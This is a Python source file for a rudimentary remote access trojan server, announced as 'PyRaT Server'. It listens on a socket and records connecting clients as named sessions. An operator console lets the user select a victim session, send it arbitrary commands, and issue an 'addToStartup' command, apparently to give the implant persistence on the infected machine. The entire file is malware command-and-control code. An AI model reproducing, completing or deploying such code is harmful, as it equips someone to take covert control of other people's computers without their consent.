import socket
import threading
from collections import defaultdict

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = "localhost"
port = 8000

sessions_list = []

sessions = {


}

sessions_sockets = []

def sendCommand(command):
    try:
        current_session.send(bytes(f"{command}", "utf-8"))
    except:
        print("selected client is not longer available")
        disconnect(current_session_username ,current_session)

def disconnect(username, client):

    sessions_sockets.remove(client)

    sessions.pop(username)

    sessions_list.remove(username)

def selectSession(username):

    print(f"username: {username}")
    print(sessions_list)
    print(sessions)
    print(sessions_sockets)
    print("//////////////////")
    print(sessions.get(f"{username}"))
    print("//////////////////")


    for i in sessions_sockets:
        if i == sessions.get(f"{username}"):
            print("socket matched!")
            global current_session
            current_session = i
            global current_session_username
            current_session_username = username
            print("succesfully selected")
            print(i)

def handshake(client):
    username = client.recv(1024).decode("utf-8")
    print(username, " connected!")

    #usernames[session_name].append(session_name + "./." + str(client) + "./.")

    sessions_sockets.append(client)

    sessions[f"{username}"] = client


    sessions_list.append(username)



def main():
    print("PyRaT Server running")
    s.bind((ip, port))
    s.listen(5)
    while True:
        client, address = s.accept()
        print(str(address[0]) + ':' + str(address[1]) + ' connected')
        threading.Thread(target=handshake, args=(client, )).start()

def user_input():
    while True:
        cmnd = input(">>> ")
        if cmnd == "sessions":
            print("Available sessions: /n", sessions_list)
        elif "set session" in cmnd:
            name = cmnd.replace("set session ", "")
            print(name)
            selectSession(name)
        elif "send" in cmnd:
            msg = cmnd.replace("send ", "")
            sendCommand(msg)
        elif "addToStartup" in cmnd:
            sendCommand(cmnd)
            response = current_session.recv(1024).decode("utf-8")
            print(response)







threading.Thread(target=main, args=()).start()
threading.Thread(target=user_input, args=()).start()